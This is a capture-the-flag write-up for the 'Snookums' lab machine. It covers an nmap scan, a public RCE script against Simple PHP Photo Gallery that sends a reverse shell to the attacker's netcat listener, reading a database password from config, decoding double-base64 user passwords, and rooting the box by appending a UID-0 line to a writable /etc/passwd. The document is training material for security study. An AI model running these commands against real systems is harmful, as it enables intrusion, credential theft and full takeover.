---
title: "Snookums - Writeup"
linkTitle: "Snookums"
weight: 8
featured: true
platform: "PG"
name: "Snookums"
os: "Linux"
difficulty: "Medium"
release: "04 Jul 2026"
ip: "192.168.195.58"
# Drop a real avatar at static/img/pg/snookums.png and uncomment:
# avatar: "/img/pg/snookums.png"
tags: ["linux", "simple-php-gallery", "rce", "mysql", "base64", "writable-passwd", "sudo"]
description: "Medium Linux box. An old PHP gallery app gives RCE, a leaked DB config leads to double-base64-encoded user passwords, and a misconfigured /etc/passwd ownership finishes the chain."
---

{{< htb name="Snookums" os="Linux" difficulty="Medium" release="04 Jul 2026" ip="192.168.195.58" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# nmap 192.168.195.58
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

```
(root㉿kali)# nmap 192.168.195.58 -p21,22,80,111,445,3306 -sCV -Pn
```

```
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
111/tcp  open  rpcbind     2-4 (RPC #100000)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix
```

## Enumeration

Port 80 hosts a **Simple PHP Photo Gallery v0.8** install.

![Simple PHP Photo Gallery homepage showing version 0.8](/img/pg/snookums/01-photo-gallery.png)

This exact version has a public RCE, [SimplePHPGal-RCE.py](https://github.com/beauknowstech/SimplePHPGal-RCE.py).

## Initial Foothold

```
(root㉿kali)# python SimplePHPGal-RCE.py http://192.168.195.58/ 192.168.45.170 21
(root㉿kali)# nc -lnvp 21
```

A shell lands as the web service account.

```
bash-4.2$ ls
```

```
README.txt   image.php   phpGalleryConfig.php   db.php   index.php
```

The app's own config file is sitting right there.

```
bash-4.2$ cat db.php
```

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
```

A `root` credential, worth testing against the system account first.

```
bash-4.2$ su root
```

```
Password: MalapropDoffUtilize1337
su: Authentication failure
```

No match. This is a database credential, not a system one, so use it where it actually belongs.

## Privilege Escalation

```
bash-4.2$ mysql -u root -p'MalapropDoffUtilize1337' SimplePHPGal
```

```
mysql> select * from users;
```

```
+----------+----------------------------------------------+
| username | password                                      |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
```

The values decode through base64 twice.

```
(root㉿kali)# echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d | base64 -d
```

```
HockSydneyCertify123#
```

Cross-referencing with home directories on the box, `michael` is the one that exists.

```
bash-4.2$ ls /home
```

```
michael
```

```
bash-4.2$ su michael
```

```
Password: HockSydneyCertify123#
```

Login succeeds. Check `/etc/passwd` permissions immediately, they're rarely worth a second glance, but this one is.

```
sh-4.2$ ls -la /etc/passwd
```

```
-rw-r--r--. 1 michael root 1162 Jun 22 2021 /etc/passwd
```

`michael` owns the file. That's a direct route to root, append a new UID-0 entry with a known password hash.

```
sh-4.2$ echo 'hacker2:$1$x$iymUwicr/.AF0Fb03C75g0:0:0:root:/root:/bin/bash' >> /etc/passwd
sh-4.2$ su hacker2
```

```
Password: pass123
```

```
[root@snookums tmp]# cat proof.txt
```

```
3fcefe09a816eafabed0766d75c15a0c
```

## Lessons learned

- A leaked credential belongs to whatever service it was configured for, not automatically to the OS. The DB password here failed as a system login but worked perfectly against MySQL itself, test creds in their actual context before writing them off.
- Don't stop at one layer of decoding. These password hashes needed base64 run twice before they were readable, if a decoded value still looks like noise, try decoding it again.
- Check file ownership on sensitive system files the moment a shell lands, not just whether they're world-readable. An unexpected owner on `/etc/passwd` is one of the most direct paths to root there is.
